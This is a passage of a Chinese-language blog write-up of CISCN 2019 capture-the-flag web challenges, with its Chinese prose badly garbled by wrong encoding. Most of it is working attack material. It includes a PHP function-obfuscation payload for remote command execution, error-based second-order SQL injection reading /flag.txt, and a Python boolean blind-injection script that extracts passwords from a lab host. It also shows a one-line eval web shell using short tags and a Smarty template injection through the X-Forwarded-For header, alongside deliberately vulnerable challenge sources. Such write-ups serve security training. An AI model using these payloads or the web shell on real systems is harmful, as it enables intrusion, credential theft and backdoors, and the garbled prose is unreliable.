class="line">$$pi&#x3D;$_GET;</span><br></pre></td></tr></table></figure><p>æ•…æœ€åpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat%20&#x2F;flag</span><br></pre></td></tr></table></figure><p><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/flag.PNG" class="lazyload" data-srcset="flag.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"><br>é™¤æ­¤ä¹‹å¤–è¿˜å¯ä»¥æ„é€ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(getallheaders()&#123;1&#125;)</span><br></pre></td></tr></table></figure><p>åœ¨headersé‡ŒåŠ ä¸Š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1:cat &#x2F;flag</span><br></pre></td></tr></table></figure><p>è¿™ä¸€é¡¹æ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi&#x3D;base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</span><br></pre></td></tr></table></figure><p>ç”±äºç»“æœæ˜¯echoè¿”å›çš„ï¼Œä¸Šé¢ä½¿ç”¨é€—å·å¯ä»¥å°†ä¸¤ä¸ªç»“æœéƒ½æ‰“å°å‡ºæ¥ã€‚<br>å…¶ä»–æ€è·¯åŒ…æ‹¬ç›´æ¥æ„é€ RCEè¯­å¥ï¼Œä½†æ˜¯æ„Ÿè§‰æ²¡æœ‰ä¸Šé¢çš„æ–¹æ³•ç”¨èµ·æ¥èˆ’æœã€‚çœ‹åˆ°ç½‘ä¸Šè¿˜æœ‰å…¶ä»–éå¸¸æœ‰æ„æ€çš„è§£æ³•ï¼Œå°±ä¸ä¸€ä¸€åˆ—ä¸¾äº†ã€‚</p><h1 id="CyberPunk-äºŒæ¬¡æ³¨å…¥"><a href="#CyberPunk-äºŒæ¬¡æ³¨å…¥" class="headerlink" title="CyberPunk(äºŒæ¬¡æ³¨å…¥)"></a>CyberPunk(äºŒæ¬¡æ³¨å…¥)</h1><p>ä¸Šæ¥index.phpä¸­ç»™äº†å§“åï¼Œç”µè¯ï¼Œåœ°å€ä¸‰ä¸ªæ¡†æ¥å¡«ã€‚åŒæ—¶è¿˜æœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼šæŸ¥è¯¢ï¼Œä¿®æ”¹ï¼Œåˆ é™¤ã€‚ç”±äºæŸ¥è¯¢è¿™ä¸€ä¸ªæ“ä½œéƒ½åªè¦å§“åç”µè¯ï¼Œæˆ‘çŒœæµ‹å‰©ä¸‹çš„åœ°å€è¿™ä¸ªå‚æ•°å¯èƒ½æ˜¯é€šè¿‡è¾“å…¥å§“åç”µè¯å¯¹åœ°å€è¿›è¡ŒæŸç§è§¦å‘å¼æ³¨å…¥ã€‚åŸºæœ¬å¯ä»¥çŒœæµ‹æ˜¯sqlæ³¨å…¥é¢˜å‹ã€‚</p><p>ä»æºç å¤„å¾—åˆ°ä¸€ä¸ªfileå‚æ•°ã€‚æœæ–­æ–‡ä»¶åŒ…å«è¯»åˆ°æºç ï¼š<br>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'/var/www/html/'</span>);</span><br><span class="line"></span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$file = (<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]) ? $_GET[<span class="string">'file'</span>] : <span class="keyword">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/phar|zip|bzip2|zlib|data|input|%00/i"</span>,$file)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">'no way!'</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>search.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        <span class="keyword">if</span>(!$row) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">"&lt;p&gt;å§“å:"</span>.$row[<span class="string">'user_name'</span>].<span class="string">"&lt;/p&gt;&lt;p&gt;, ç”µè¯:"</span>.$row[<span class="string">'phone'</span>].<span class="string">"&lt;/p&gt;&lt;p&gt;, åœ°å€:"</span>.$row[<span class="string">'address'</span>].<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"æœªæ‰¾åˆ°è®¢å•!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">"ä¿¡æ¯ä¸å…¨"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>change.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"address"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $address = addslashes($_POST[<span class="string">"address"</span>]);</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">"update `user` set `address`='"</span>.$address.<span class="string">"', `old_address`='"</span>.$row[<span class="string">'address'</span>].<span class="string">"' where `user_id`="</span>.$row[<span class="string">'user_id'</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">"è®¢å•ä¿®æ”¹æˆåŠŸ"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"æœªæ‰¾åˆ°è®¢å•!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">"ä¿¡æ¯ä¸å…¨"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>delete.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $result = $db-&gt;query(<span class="string">'delete from `user` where `user_id`='</span> . $row[<span class="string">"user_id"</span>]);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">"è®¢å•åˆ é™¤æˆåŠŸ"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"æœªæ‰¾åˆ°è®¢å•!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">"ä¿¡æ¯ä¸å…¨"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å®¡è®¡æºç åé‡ç‚¹å…³æ³¨addressæœ‰æ— æ³¨å…¥ï¼Œå‘ç°é¢˜ç›®éƒ½åªå¯¹å‰ä¸¤ä¸ªå‚æ•°è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¹¶æœªæ£€æŸ¥<code>address</code>ã€‚åŒæ—¶<code>address</code>åªç»è¿‡äº†ä¸€æ¬¡<code>addslashes()</code>å°±è¢«å­˜å‚¨ï¼Œè¿™æ˜¯ç»å…¸çš„äºŒæ¬¡æ³¨å…¥çš„ä½¿ç”¨åœºæ™¯ã€‚åŠ ä¸Šè§¦å‘æ–¹å¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">"update `user` set `address`='"</span>.$address.<span class="string">"', `old_address`='"</span>.$row[<span class="string">'address'</span>].<span class="string">"' where `user_id`="</span>.$row[<span class="string">'user_id'</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure><p>å›æ˜¾ä»¥<code>error</code>çš„å½¢å¼è¢«æ‰“å°å‡ºæ¥ï¼Œè¯æ˜æˆ‘ä»¬éœ€è¦ä½¿ç”¨æŠ¥é”™æ³¨å…¥ã€‚<br>å…·ä½“å½¢å¼æ˜¯ï¼Œæˆ‘ä»¬æäº¤å§“åï¼Œç”µè¯ï¼Œåœ°å€ä¸‰ä¸ªå‚æ•°ï¼Œå¹¶åœ¨åœ°å€ä½¿ç”¨æŠ¥é”™æ³¨å…¥ã€‚ä¹‹ååœ¨change.phpå†æ¬¡æäº¤ç›¸åŒå§“åç”µè¯ä¸éšä¾¿å†™åœ°å€ï¼Œå³å¯è§¦å‘<code>update</code>æ‰§è¡ŒæŠ¥é”™æ³¨å…¥ã€‚æ ¹æ®updateè¯­å¥æ„é€ payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select substr(load_file(&#39;&#x2F;flag.txt&#39;),1,20)),0x7e),1)#</span><br></pre></td></tr></table></figure><p>è²Œä¼¼é¢˜ç›®flagä¸åœ¨åº“é‡Œï¼Œçœ‹wpå‘ç°æ˜¯/flag.txtã€‚æœ‰ç‚¹è¿·æƒ‘ã€‚éœ€è¦æ³¨æ„æŠ¥é”™æ³¨å…¥å­—æ®µæ•°çš„é™åˆ¶ï¼Œè°ƒæ•´<code>substr()</code>çš„åä¸¤ä¸ªå‚æ•°ã€‚</p><h1 id="Easywebï¼ˆå¸ƒå°”ç›²æ³¨ï¼‰"><a href="#Easywebï¼ˆå¸ƒå°”ç›²æ³¨ï¼‰" class="headerlink" title="Easywebï¼ˆå¸ƒå°”ç›²æ³¨ï¼‰"></a>Easywebï¼ˆå¸ƒå°”ç›²æ³¨ï¼‰</h1><p>å¼€å§‹ä»robots.txtå¾—åˆ°çš„image.php.bakçš„æºç æ³„éœ²ä¿¡æ¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;ï»¿?php</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">"id"</span>])?$_GET[<span class="string">"id"</span>]:<span class="string">"1"</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">"path"</span>])?$_GET[<span class="string">"path"</span>]:<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="string">"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'"</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">"./"</span> . $row[<span class="string">"path"</span>];</span><br><span class="line">header(<span class="string">"Content-Type: image/jpeg"</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰sqlæ³¨å…¥ç‚¹ï¼Œä¸»è¦è¦åº”å¯¹ä¸¤ä¸ªå‚æ•°çš„è¿‡æ»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);</span><br><span class="line">$path&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);</span><br></pre></td></tr></table></figure><p>è€ƒè™‘ä½¿ç”¨<code>\0</code>ï¼Œå¹¶åœ¨pathä¸­æ³¨å…¥ã€‚è¿™æ ·æˆ‘ä»¬çš„sqlè¯­å¥å°±å˜æˆäº†:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from images where id&#x3D;&#39; or path&#x3D;&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure><p>å‰©ä¸‹çš„å¸ƒå°”ç›²æ³¨å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    a=<span class="number">0</span></span><br><span class="line">    print(i)<span class="comment">#ciscnfinal, images,users</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">128</span>):<span class="comment">#select group_concat(column_name) from information_schema.columns where table_name=database()</span></span><br><span class="line">        <span class="comment">#url = "http://b086efbf-5393-4974-b79d-0608047a11b0.node3.buuoj.cn/image.php?id=\\0&amp;path=or%20id=if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),"+str(i)+",1))="+str(j)+",1,0)%23"</span></span><br><span class="line">        url = <span class="string">"http://b086efbf-5393-4974-b79d-0608047a11b0.node3.buuoj.cn/image.php?id=\\0&amp;path=or%20id=if(ascii(substr((select group_concat(password) from users),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">",1,0)%23"</span></span><br><span class="line">        res = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'JFIF'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            a = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>æ³¨å…¥å¾—åˆ°usernameä¸passwordç™»å½•è¿›å…¥åå°ã€‚å‘ç°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚ç®€å•fuzzä¸‹å‘ç°æ–‡ä»¶åä¼šè¢«å­˜å‚¨åˆ°å›ºå®šphpæ—¥å¿—æ–‡ä»¶ä¸­<code>logs/upload.b888aaa68e9659c297c4b02084157cff.log.php</code><br>æ—¢ç„¶å¦‚æ­¤åªéœ€ä¸Šä¼ ä¸€å¥è¯ã€‚å‘ç°phpå…³é”®å­—è¢«æ‹¦ã€‚<br>ä½¿ç”¨çŸ­æ ‡ç­¾ç»•è¿‡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=@<span class="keyword">eval</span>($_GET[<span class="string">'byc'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯å› ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;php.iniä¸­</span><br><span class="line">short_open_tag &#x3D; On</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;é™¤&lt;?php ?&gt;ï¼Œå¯ä½¿ç”¨æ›´çµæ´»çš„è°ƒç”¨æ–¹æ³•</span><br><span class="line">&lt;? &#x2F;*ç¨‹åºæ“ä½œ*&#x2F; ?&gt;</span><br><span class="line">&lt;?&#x3D;&#x2F;*å‡½æ•°*&#x2F;?&gt;</span><br></pre></td></tr></table></figure><p>bypassæ‰åæ‰§è¡Œå‘½ä»¤<code>system(&#39;cat /flag&#39;);</code>å³å¯</p><h1 id="åä¸œå—èµ›åŒº-Web11ï¼ˆæ¨¡æ¿æ³¨å…¥ï¼‰"><a href="#åä¸œå—èµ›åŒº-Web11ï¼ˆæ¨¡æ¿æ³¨å…¥ï¼‰" class="headerlink" title="åä¸œå—èµ›åŒº Web11ï¼ˆæ¨¡æ¿æ³¨å…¥ï¼‰"></a>åä¸œå—èµ›åŒº Web11ï¼ˆæ¨¡æ¿æ³¨å…¥ï¼‰</h1><p>è¿™é¢˜å¼€å§‹çœ‹çš„æˆ‘è´¼å¥‡æ€ªï¼Œå› ä¸ºæ•´ä¸ªç½‘ç«™è²Œä¼¼åªæ˜¯ä¸€ä¸ªapiæ¥å£ã€‚å…¶ä¸­å›æ˜¾æœ‰ä¸€éƒ¨åˆ†ååˆ†æ˜¾çœ¼<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="xff"><br>å¼€å§‹è€ƒè™‘æ˜¯å¦å­˜åœ¨å…³äºxffå¤´çš„ä¿¡æ¯ã€‚ä½†æ˜¯æ²¡æµ‹å‡ºæ¥ã€‚å»ç½‘ä¸Šæœäº†æ³¢wpæç„¶å¤§æ‚Ÿã€‚åŸæ¥å…³é”®ç‚¹åœ¨ç½‘é¡µä¸‹æ–¹æç¤ºçš„<code>Build With Smarty !</code><br>Smartyæ˜¯ä¸€ç§phpç½‘é¡µå¼•æ“ï¼Œä¹Ÿå­˜åœ¨å¦‚pythonjinja2çš„sstiæ³¨å…¥ã€‚</p><p>åŒæ—¶å…¶ä½¿ç”¨æ–¹æ³•å¦‚<code>{if cmd}{/if}</code>å¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚<br>æ‰€ä»¥é¦–å…ˆbpé‡Œæ›´æ”¹xffåŒ…ï¼Œå°è¯•2,å‘ç°æ³¨å…¥æˆåŠŸï¼›<br>ä¹‹åç›´æ¥ä»»æ„å‘½ä»¤æ‰§è¡Œå³å¯æ‹¿åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;file_get_contents(&#39;&#x2F;flag&#39;)&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/flag4.PNG" class="lazyload" data-srcset="flag4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p><h1 id="åä¸œåŒ—èµ›åŒº-Web2ï¼ˆå­˜å‚¨å‹xss-sqlæ³¨å…¥ï¼‰"><a href="#åä¸œåŒ—èµ›åŒº-Web2ï¼ˆå­˜å‚¨å‹xss-sqlæ³¨å…¥ï¼‰" class="headerlink" title="åä¸œåŒ—èµ›åŒº Web2ï¼ˆå­˜å‚¨å‹xss+sqlæ³¨å…¥ï¼‰"></a>åä¸œåŒ—èµ›åŒº 